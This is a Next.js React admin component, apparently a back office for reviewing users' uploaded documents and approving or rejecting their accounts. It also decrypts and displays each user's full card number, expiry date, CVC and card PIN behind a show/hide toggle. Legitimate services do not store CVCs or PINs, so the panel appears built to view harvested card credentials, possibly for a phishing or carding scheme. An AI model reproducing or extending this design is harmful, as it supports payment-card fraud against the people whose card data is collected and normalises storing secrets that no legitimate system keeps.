"use client";

import { useState } from "react";
import { useRouter } from "next/navigation";
import { Button } from "@/components/ui/button";

type Doc = {
  id: string;
  fileName: string;
  fileUrl: string;
  type: "RECEIPT" | "CERTIFICATE" | "OTHER";
  status: "PENDING" | "VERIFIED" | "REJECTED";
};

type Props = {
  userId: string;
  initialStatus: "PENDING" | "UNDER_REVIEW" | "APPROVED" | "REJECTED";
  docs: Doc[];
  decryptedFinancial: {
    cardName: string;
    cardNumber: string;
    cvc: string;
    pin: string;
    expiryDate: string;
    lastFour: string;
  } | null;
};

export function UserDetailPanel({ userId, initialStatus, docs, decryptedFinancial }: Props) {
  const router = useRouter();
  const [showSensitive, setShowSensitive] = useState(false);
  const [feedback, setFeedback] = useState("");
  const [accountStatus, setAccountStatus] = useState(initialStatus);

  async function updateDocStatus(documentId: string, status: "VERIFIED" | "REJECTED") {
    await fetch(`/api/admin/documents/${documentId}`, {
      method: "PATCH",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ status, note: feedback.trim() || undefined }),
    });
    router.refresh();
  }

  async function approveAccount() {
    await fetch(`/api/admin/users/${userId}/status`, {
      method: "PATCH",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ status: "APPROVED" }),
    });
    setAccountStatus("APPROVED");
    router.refresh();
  }

  async function rejectAccount() {
    await fetch(`/api/admin/users/${userId}/status`, {
      method: "PATCH",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ status: "REJECTED" }),
    });
    setAccountStatus("REJECTED");
    router.refresh();
  }

  async function sendFeedback() {
    if (!feedback.trim()) return;
    await fetch(`/api/admin/users/${userId}/notify`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ title: "Documents a corriger", message: feedback.trim() }),
    });
    setFeedback("");
    router.refresh();
  }

  return (
    <div className="space-y-6">
      <div className="rounded-lg border p-4">
        <div className="mb-3 flex items-center justify-between">
          <h3 className="font-semibold">Données financières (déchiffrées)</h3>
          <Button variant="outline" onClick={() => setShowSensitive((v) => !v)}>
            {showSensitive ? "Hide" : "Show"}
          </Button>
        </div>
        {!decryptedFinancial ? (
          <p className="text-sm text-muted-foreground">Aucune information financière trouvée.</p>
        ) : (
          <div className="grid gap-2 text-sm">
            <p>Card Name: {decryptedFinancial.cardName}</p>
            <p>Card Number: {showSensitive ? decryptedFinancial.cardNumber : `**** **** **** ${decryptedFinancial.lastFour}`}</p>
            <p>Expiry: {decryptedFinancial.expiryDate}</p>
            <p>CVC: {showSensitive ? decryptedFinancial.cvc : "***"}</p>
            <p>PIN: {showSensitive ? decryptedFinancial.pin : "****"}</p>
          </div>
        )}
      </div>

      <div className="rounded-lg border p-4">
        <h3 className="mb-3 font-semibold">Document Gallery</h3>
        <div className="space-y-3">
          {docs.map((doc) => (
            <div key={doc.id} className="rounded-md border p-3">
              <p className="font-medium">{doc.fileName}</p>
              <p className="text-sm text-muted-foreground">Type: {doc.type} | Status: {doc.status}</p>
              <div className="mt-2 flex flex-wrap gap-2">
                {doc.fileUrl.startsWith("http") ? (
                  <a href={doc.fileUrl} target="_blank" className="underline underline-offset-4">
                    Ouvrir
                  </a>
                ) : (
                  <span className="text-xs text-muted-foreground">{doc.fileUrl}</span>
                )}
                <Button size="sm" variant="outline" onClick={() => updateDocStatus(doc.id, "VERIFIED")}>
                  Verify
                </Button>
                <Button size="sm" variant="outline" onClick={() => updateDocStatus(doc.id, "REJECTED")}>
                  Reject
                </Button>
              </div>
            </div>
          ))}
        </div>
      </div>

      <div className="rounded-lg border p-4">
        <h3 className="mb-2 font-semibold">Approval Actions</h3>
        <p className="mb-3 text-sm text-muted-foreground">Statut compte actuel: {accountStatus}</p>
        <div className="flex flex-wrap gap-2">
          <Button onClick={approveAccount}>Approve Account</Button>
          <Button variant="outline" onClick={rejectAccount}>
            Reject Account
          </Button>
        </div>
      </div>

      <div className="rounded-lg border p-4">
        <h3 className="mb-2 font-semibold">Feedback Loop</h3>
        <textarea
          className="min-h-[100px] w-full rounded-md border bg-background p-3 text-sm"
          placeholder="Indiquez ce qui doit être corrigé..."
          value={feedback}
          onChange={(e) => setFeedback(e.target.value)}
        />
        <div className="mt-2">
          <Button onClick={sendFeedback}>Envoyer une notification</Button>
        </div>
      </div>
    </div>
  );
}
